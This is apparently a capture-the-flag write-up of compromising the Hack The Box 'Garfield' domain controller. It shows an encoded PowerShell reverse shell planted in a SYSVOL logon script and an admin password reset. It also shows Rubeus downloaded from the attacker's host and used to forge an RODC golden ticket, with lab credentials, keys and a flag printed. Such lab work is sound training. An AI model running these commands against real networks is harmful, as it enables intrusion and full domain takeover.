# Garfield HTB

## Enumeration

```dhall
As is common in real life pentests, you will start the Garfield box with credentials for the following account j.arbuckle / Th1sD4mnC4t!@1978
```

Nmap scan 

```dhall
rustscan --ulimit=5000 -a 10.129.30.234 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
TCP handshake? More like a friendly high-five!

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.30.234:53
Open 10.129.30.234:88
Open 10.129.30.234:135
Open 10.129.30.234:139
Open 10.129.30.234:389
Open 10.129.30.234:445
Open 10.129.30.234:464
Open 10.129.30.234:593
Open 10.129.30.234:5985
Open 10.129.30.234:9389
Open 10.129.30.234:49670
Open 10.129.30.234:49899
Open 10.129.30.234:49674
Open 10.129.30.234:49671
Open 10.129.30.234:49673
Open 10.129.30.234:54527
[~] Starting Script(s)

Scanning 10.129.30.234 [16 ports]
Discovered open port 139/tcp on 10.129.30.234
Discovered open port 49674/tcp on 10.129.30.234
Discovered open port 445/tcp on 10.129.30.234
Discovered open port 53/tcp on 10.129.30.234
Discovered open port 135/tcp on 10.129.30.234
Discovered open port 5985/tcp on 10.129.30.234
Discovered open port 464/tcp on 10.129.30.234
Discovered open port 49673/tcp on 10.129.30.234
Discovered open port 88/tcp on 10.129.30.234
Discovered open port 49899/tcp on 10.129.30.234
Discovered open port 389/tcp on 10.129.30.234
Discovered open port 54527/tcp on 10.129.30.234
Discovered open port 9389/tcp on 10.129.30.234
Discovered open port 49671/tcp on 10.129.30.234
Discovered open port 593/tcp on 10.129.30.234
Discovered open port 49670/tcp on 10.129.30.234

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-04-08 20:02:08Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: garfield.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49899/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
54527/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.98%E=4%D=4/8%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=69D64424%P=x86_64-pc-linux-gnu)
SEQ(SP=103%GCD=1%ISR=10A%TI=I%II=I%SS=S%TS=U)
SEQ(SP=104%GCD=1%ISR=108%TI=I%II=I%SS=S%TS=U)
OPS(O1=M552NW8NNS%O2=M552NW8NNS%O3=M552NW8%O4=M552NW8NNS%O5=M552NW8NNS%O6=M552NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-04-08T20:03:10
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 38880/tcp): CLEAN (Timeout)
|   Check 2 (port 45415/tcp): CLEAN (Timeout)
|   Check 3 (port 46688/udp): CLEAN (Timeout)
|   Check 4 (port 33974/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 7h59m59s

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   206.24 ms 10.10.14.1
2   206.47 ms 10.129.30.234

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:03
Completed NSE at 08:03, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:03
Completed NSE at 08:03, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:03
Completed NSE at 08:03, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.45 seconds
           Raw packets sent: 104 (8.260KB) | Rcvd: 42 (2.432KB)

```

#### Credentials:

```jsx
User: 'j.arbuckle'
Pass: 'Th1sD4mnC4t!@1978'
```

## SMB

Authenticated

```jsx
┌──(kali㉿kali)-[~/…/Hacking/HTB/Seasonal/Garfield]
└─$ nxc smb 10.129.30.234 -u j.arbuckle -p 'Th1sD4mnC4t!@1978'
SMB         10.129.30.234   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                                           
SMB         10.129.30.234   445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978 
                                                                                                                                                     
┌──(kali㉿kali)-[~/…/Hacking/HTB/Seasonal/Garfield]
└─$ nxc smb 10.129.30.234 -u j.arbuckle -p 'Th1sD4mnC4t!@1978'  --shares
SMB         10.129.30.234   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                                           
SMB         10.129.30.234   445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978 
SMB         10.129.30.234   445    DC01             [*] Enumerated shares
SMB         10.129.30.234   445    DC01             Share           Permissions     Remark
SMB         10.129.30.234   445    DC01             -----           -----------     ------
SMB         10.129.30.234   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.30.234   445    DC01             C$                              Default share
SMB         10.129.30.234   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.30.234   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.30.234   445    DC01             SYSVOL          READ            Logon server share 

```

Enumerating for Users

```jsx
$ nxc smb 10.129.30.234 -u j.arbuckle -p 'Th1sD4mnC4t!@1978'  --users 
SMB         10.129.30.234   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                                           
SMB         10.129.30.234   445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978 
SMB         10.129.30.234   445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                                                                                                                                                               
SMB         10.129.30.234   445    DC01             Administrator                 2025-10-03 17:29:26 0       Built-in account for administering the computer/domain                                                                                                                                      
SMB         10.129.30.234   445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain                                                                                                                                    
SMB         10.129.30.234   445    DC01             krbtgt                        2025-08-13 11:05:26 0       Key Distribution Center Service Account                                                                                                                                                     
SMB         10.129.30.234   445    DC01             krbtgt_8245                   2025-08-17 11:33:39 0       Key Distribution Center service account for read-only domain controller                                                                                                                     
SMB         10.129.30.234   445    DC01             j.arbuckle                    2025-09-09 15:50:55 0        
SMB         10.129.30.234   445    DC01             l.wilson                      2026-01-27 21:40:33 0        
SMB         10.129.30.234   445    DC01             l.wilson_adm                  2026-01-13 14:56:35 0        
SMB         10.129.30.234   445    DC01             [*] Enumerated 7 local users: GARFIELD
                                                                                                 
```

### Enumerating Computers

```jsx
┌──(kali㉿kali)-[~/…/Hacking/HTB/Seasonal/Garfield]
└─$ nxc ldap 10.129.30.234 -u j.arbuckle -p 'Th1sD4mnC4t!@1978'  --computers        
LDAP        10.129.30.234   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:garfield.htb) (signing:None) (channel binding:No TLS cert)                                                                                                                               
LDAP        10.129.30.234   389    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978 
LDAP        10.129.30.234   389    DC01             [*] Total records returned: 2
LDAP        10.129.30.234   389    DC01             DC01$
LDAP        10.129.30.234   389    DC01             RODC01$

```

### Bloodhound

```jsx
┌──(kali㉿kali)-[~/…/Hacking/HTB/Seasonal/Garfield]
└─$ bloodhound-python -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -d garfield.htb -ns 10.129.30.234 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: garfield.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.garfield.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.garfield.htb
INFO: Testing resolved hostname connectivity dead:beef::6383:3cc1:69c9:e8b0
INFO: Trying LDAP connection to dead:beef::6383:3cc1:69c9:e8b0
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.garfield.htb
INFO: Testing resolved hostname connectivity dead:beef::6383:3cc1:69c9:e8b0
INFO: Trying LDAP connection to dead:beef::6383:3cc1:69c9:e8b0
INFO: Found 8 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: RODC01.garfield.htb
INFO: Querying computer: DC01.garfield.htb
INFO: Done in 00M 47S
INFO: Compressing output into 20260408081633_bloodhound.zip

```

### Checking for writable perms

```jsx
┌──(kali㉿kali)-[~/…/Hacking/HTB/Seasonal/Garfield]
└─$ bloodyAD  -d garfield.htb --host 10.129.30.234 -u j.arbuckle -p 'Th1sD4mnC4t!@1978' get writable --otype ALL --right ALL --detail 

distinguishedName: CN=Guest,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=garfield,DC=htb
url: WRITE
wWWHomePage: WRITE

distinguishedName: CN=krbtgt_8245,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=Jon Arbuckle,CN=Users,DC=garfield,DC=htb
thumbnailPhoto: WRITE
pager: WRITE
mobile: WRITE
homePhone: WRITE
userSMIMECertificate: WRITE
msDS-ExternalDirectoryObjectId: WRITE
msDS-cloudExtensionAttribute20: WRITE
msDS-cloudExtensionAttribute19: WRITE
msDS-cloudExtensionAttribute18: WRITE
msDS-cloudExtensionAttribute17: WRITE
msDS-cloudExtensionAttribute16: WRITE
msDS-cloudExtensionAttribute15: WRITE
msDS-cloudExtensionAttribute14: WRITE
msDS-cloudExtensionAttribute13: WRITE
msDS-cloudExtensionAttribute12: WRITE
msDS-cloudExtensionAttribute11: WRITE
msDS-cloudExtensionAttribute10: WRITE
msDS-cloudExtensionAttribute9: WRITE
msDS-cloudExtensionAttribute8: WRITE
msDS-cloudExtensionAttribute7: WRITE
msDS-cloudExtensionAttribute6: WRITE
msDS-cloudExtensionAttribute5: WRITE
msDS-cloudExtensionAttribute4: WRITE
msDS-cloudExtensionAttribute3: WRITE
msDS-cloudExtensionAttribute2: WRITE
msDS-cloudExtensionAttribute1: WRITE
msDS-GeoCoordinatesLongitude: WRITE
msDS-GeoCoordinatesLatitude: WRITE
msDS-GeoCoordinatesAltitude: WRITE
msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE
msPKI-CredentialRoamingTokens: WRITE
msDS-FailedInteractiveLogonCountAtLastSuccessfulLogon: WRITE
msDS-FailedInteractiveLogonCount: WRITE
msDS-LastFailedInteractiveLogonTime: WRITE
msDS-LastSuccessfulInteractiveLogonTime: WRITE
msDS-SupportedEncryptionTypes: WRITE
msPKIAccountCredentials: WRITE
msPKIDPAPIMasterKeys: WRITE
msPKIRoamingTimeStamp: WRITE
mSMQDigests: WRITE
mSMQSignCertificates: WRITE
userSharedFolderOther: WRITE
userSharedFolder: WRITE
url: WRITE
otherIpPhone: WRITE
ipPhone: WRITE
assistant: WRITE
primaryInternationalISDNNumber: WRITE
primaryTelexNumber: WRITE
otherMobile: WRITE
otherFacsimileTelephoneNumber: WRITE
userCert: WRITE
scriptPath: WRITE
homePostalAddress: WRITE
personalTitle: WRITE
wWWHomePage: WRITE
otherHomePhone: WRITE
streetAddress: WRITE
otherPager: WRITE
info: WRITE
otherTelephone: WRITE
userCertificate: WRITE
preferredDeliveryMethod: WRITE
registeredAddress: WRITE
internationalISDNNumber: WRITE
x121Address: WRITE
facsimileTelephoneNumber: WRITE
teletexTerminalIdentifier: WRITE
telexNumber: WRITE
telephoneNumber: WRITE
physicalDeliveryOfficeName: WRITE
postOfficeBox: WRITE
postalCode: WRITE
postalAddress: WRITE
street: WRITE
st: WRITE
l: WRITE
c: WRITE

distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE
                                                                                                                                                     
┌──(kali㉿kali)-[~/…/Hacking/HTB/Seasonal/Garfield]
└─$ bloodyAD  -d garfield.htb --host 10.129.30.234 -u j.arbuckle -p 'Th1sD4mnC4t!@1978' get writable                                 

distinguishedName: CN=Guest,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=krbtgt_8245,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=Jon Arbuckle,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
permission: WRITE

```

### Performing **`msDS-KeyCredentialLink` attacl**

```jsx
┌──(kali㉿kali)-[~/…/Seasonal/Garfield/pywhisker/pywhisker]
└─$ python3 pywhisker.py --target l.wilson_adm -d garfield.htb  -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --action add
[*] Searching for the target account
[*] Target user found: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[!] 

```

### Initial Access

Found a script on the SYSVOL share and downloaded it. And edited it with a base64 encoded powershell revshell code. Since I had **`WRITE`** rights, i uploaded it to the share and gonna excute and get a shell.

```dhall
┌──(kali㉿kali)-[~/…/Hacking/HTB/Seasonal/Garfield]
└─$ B64=$(cat ./printerDetect.ps1 | iconv -t utf-16le | base64 -w0; echo) 
                                                                                                                                                     
┌──(kali㉿kali)-[~/…/Hacking/HTB/Seasonal/Garfield]
└─$ ls
20260408081633_bloodhound.zip  printerDetect.bat  printerDetect.ps1  pywhisker
                                                                                                                                                     
┌──(kali㉿kali)-[~/…/Hacking/HTB/Seasonal/Garfield]
└─$ echo "powershell -e $B64"
powershell -e IwBBACAAcwBpAG0AcABsAGUAIABhAG4AZAAgAHMAbQBhAGwAbAAgAHIAZQB2AGUAcgBzAGUAIABzAGgAZQBsAGwALgAgAE8AcAB0AGkAbwBuAHMAIABhAG4AZAAgAGgAZQBsAHAAIAByAGUAbQBvAHYAZQBkACAAdABvACAAcwBhAHYAZQAgAHMAcABhAGMAZQAuACAACgAjAFUAbgBjAG8AbQBtAGUAbgB0ACAAYQBuAGQAIABjAGgAYQBuAGcAZQAgAHQAaABlACAAaABhAHIAZABjAG8AZABlAGQAIABJAFAAIABhAGQAZAByAGUAcwBzACAAYQBuAGQAIABwAG8AcgB0ACAAbgB1AG0AYgBlAHIAIABpAG4AIAB0AGgAZQAgAGIAZQBsAG8AdwAgAGwAaQBuAGUALgAgAFIAZQBtAG8AdgBlACAAYQBsAGwAIABoAGUAbABwACAAYwBvAG0AbQBlAG4AdABzACAAYQBzACAAdwBlAGwAbAAuAAoAIwAkAGMAbABpAGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADAALgAxADAALgAxADUALgAzADcAJwAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAKAAoAIwAkAHMAbQA9ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADkAMgAuADEANgA4AC4AMgA1ADQALgAxACcALAA1ADUANQA1ADUAKQApAC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB0AD0AMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpAD0AJABzAG0ALgBSAGUAYQBkACgAJABiAHQALAAwACwAJABiAHQALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAD0AKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHQALAAwACwAJABpACkAOwAkAHMAdAA9ACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAKABpAGUAeAAgACQAZAAgADIAPgAmADEAKQApADsAJABzAG0ALgBXAHIAaQB0AGUAKAAkAHMAdAAsADAALAAkAHMAdAAuAEwAZQBuAGcAdABoACkAfQAKAA==
                                                                                                                                                     
┌──(kali㉿kali)-[~/…/Hacking/HTB/Seasonal/Garfield]

```

I uploaded the file to the share

```jsx
smb: \garfield.htb\Scripts\> put printerDetect.bat
putting file printerDetect.bat as \garfield.htb\Scripts\printerDetect.bat (3.9 kB/s) (average 3.9 kB/s)
smb: \garfield.htb\Scripts\> ls
  .                                   D        0  Tue Jan 27 17:13:47 2026
  ..                                  D        0  Tue Jan 27 17:13:47 2026
  printerDetect.bat                   A     2632  Wed Apr  8 18:10:29 2026

                9250815 blocks of size 4096. 979619 blocks available
smb: \garfield.htb\Scripts\> 

```

I executed the bloodyAD command to run it.

```jsx
┌──(kali㉿kali)-[~/…/Hacking/HTB/Seasonal/Garfield]
└─$ bloodyAD --host garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" scriptPath -v printerDetect.bat
[+] CN=Liz Wilson,CN=Users,DC=garfield,DC=htb's scriptPath has been updated
```

#### The Shell

```dhall
┌──(kali㉿kali)-[~/…/Seasonal/Garfield/pywhisker/pywhisker]
└─$ nc -nlvp 9001                                                           
listening on [any] 9001 ...

connect to [10.10.15.37] from (UNKNOWN) [10.129.30.234] 63089
PS C:\Windows\system32> 

```

## Privilage Escalation

### Forcing to change the password

```dhall
PS C:\Users> $newpass = ConvertTo-SecureString 'WhoKnows123!' -AsPlainText -Force
PS C:\Users> Set-ADAccountPassword -Identity l.wilson_adm -NewPassword $newpass -Reset
PS C:\Users> 

```

### User Flag.

Using evil-winrm to get the user flag.

```dhall
┌──(kali㉿kali)-[~/…/Hacking/HTB/Seasonal/Garfield]
└─$ evil-winrm -i 10.129.30.234 -u l.wilson_adm -p 'WhoKnows123!'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> dir
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\l.wilson_adm\Desktop> type user.txt
502d5fb1e70118fcebd089f3683392b8
*Evil-WinRM* PS C:\Users\l.wilson_adm\Desktop> 
```

## From l.wilson.adm to RODC01

![image.png](image.png)

### Lateral Movement

Addind user l.wilson.adm to RODC admins group

```dhall
*Evil-WinRM* PS C:\Users\l.wilson_adm\Desktop> Add-ADGroupMember -Identity "RODC Administrators" -Members "l.wilson_adm"
*Evil-WinRM* PS C:\Users\l.wilson_adm\Desktop> Get-ADGroupMember "RODC Administrators"

distinguishedName : CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
name              : Liz Wilson ADM
objectClass       : user
objectGUID        : 12355eae-9f01-44a7-8b8d-060a51e42acb
SamAccountName    : l.wilson_adm
SID               : S-1-5-21-2502726253-3859040611-225969357-3107

```

Now we have **`WRITE`** permission on RODC

```dhall
┌──(kali㉿kali)-[~/…/Hacking/HTB/Seasonal/Garfield]
└─$ bloodyAD -u l.wilson_adm -p 'WhoKnows123!' -d garfield.htb --host 10.129.30.234 get writable --otype COMPUTER

distinguishedName: CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb
permission: WRITE

```

### Getting the hash using Rubeus.

1. I downloaded rubeus from github and then transfered it to windows and was able to request for ticket. 

```dhall
*Evil-WinRM* PS C:\Users\l.wilson_adm\Desktop> Invoke-WebRequest -Uri "http://10.10.15.37:80/Rubeus.exe" -OutFile "Rubeus.exe" -UseBasicParsing
*Evil-WinRM* PS C:\Users\l.wilson_adm\Desktop> dir

    Directory: C:\Users\l.wilson_adm\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/8/2026   4:21 PM         473600 Rubeus.exe
-ar---         4/8/2026  11:58 AM             34 user.txt

```

```dhall
*Evil-WinRM* PS C:\Users\l.wilson_adm\Desktop> .\Rubeus.exe golden /rodcNumber:8245 /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:ticket.kirbi /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 /user:Administrator /id:500 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : GARFIELD.HTB (GARFIELD)
[*] SID            : S-1-5-21-2502726253-3859040611-225969357
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ServiceKey     : D6C93CBE006372ADB8403630F9E86594F52C8105A52F9B21FEF62E9C7A75E240
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : D6C93CBE006372ADB8403630F9E86594F52C8105A52F9B21FEF62E9C7A75E240
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt
[*] Target         : garfield.htb

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@garfield.htb'

[*] AuthTime       : 4/8/2026 4:23:34 PM
[*] StartTime      : 4/8/2026 4:23:34 PM
[*] EndTime        : 4/9/2026 2:23:34 AM
[*] RenewTill      : 4/15/2026 4:23:34 PM

[*] base64(ticket.kirbi):

      doIFkjCCBY6gAwIBBaEDAgEWooIEfzCCBHthggR3MIIEc6ADAgEFoQ4bDEdBUkZJRUxELkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMZ2FyZmllbGQuaHRio4IENzCCBDOgAwIBEqEGAgQgNQAAooIEIgSCBB7QBe/EhT1t7HLpgQOUWvKw5GwFetOJ7h7QC+pvDGdyYUqaQXoLqE9T55pH7jodWIA6xyUH+Jk9E9N7/joBLryUHhtDMPSDgh/AW+epYiLYE+63/3oNuptfhkHq95inwCQvXFKNgq18DjaAV1aHJtTKFBg9cgrvakR6iAVs4BwUieCBJT1v2KcETHpsWbkTcwpJwxWNnXKXINBUc+xbpLr049Ljwbw5lejfEw8l3ki2AVlHdv6Uc7EJTyLkVFrNQ6LJd0vZhYapS9AZgog5O/7WqDXOspl3YuqiAD2Z+Uy2CLIAof/13lwvxTB27P9UNajs/20+gyli8sVEP1CWUMf6GIoaxlvKoqwjnYMpZyUnFHWmCqh/vwlzQpQsLRFAeLI+VUMH6Qup+Ym+8o9hVJZKJYvMqM+tFkZ3L/9TB1d3VDICDe13LM5YpYWGuD/Pd9SLIRDHVKgMXJEpnLNMQE0HrgLb+b+J71NjGsXdPH2ORRI2vbqjdyaqOhkv1r0o5orOwlc3V1Z53XMmmXv12pBUlsuX82lYjXJWNw7K1PYKO3rA1lAHS9FF+T6IOPYrrpFxHhuBGsgI3v8NKBAEKAcYXetvWYyofGh1HyJi2UH4Zzmk6soeGjzPDIJM4zZe5UiA0BXtJ5NIiFvveiOL3SCKhOMP+zs1hAzwe7ENoSzcTUeqrlIL6wwUoWmEwRrJgmOzE9/7oUCmI7risG1K0bIEqsRKVbs9V1n90syMjyAESwPFrrmxs9RVchDUpOK4tg1WbivTa42d0xbF4sYx/pYoe7N0Q7/EkPWZxbppxUlmkHURuzZT/TY+upvSx+XCQQLKLyo9SWnkPYeOMOIM1ItnOyB3RX4UCInpBv+WrEA56URZlL7lbVS8vMEt38y46vk/1Aju0xWpgrLepRZeoWMCWs5/d5Li9OCoYP5V/w7675AgiClrMbFhPlw0ZoSLzKN8fVXWsMRRttHs79HlsSdGavKM28nsOxsTaPnLrSdUTILbLq4khhohFR9tcD+ofNPIdYqYTZZiBCPQd2NzOLMXttcJYdvR9RVxsRe5v/19V5IZKhujyU8EiUHMGestchLSYGXpGrBe+hooRwX4700LIhZ3t2jzdBZbKHIhc6CiGsp8xZB7oYdgi7G9CDWPN90+gd37cEcA9PfvmUGlcGVG/baRoLdPUz8Vb8O6Fz47GD6h8FiJufxfrN2oDIzHHabMjxP052fkgtOAXTpwduEJ0fKddDOSXRLBXUTjuUJQLleAwwD4XFws8Qe+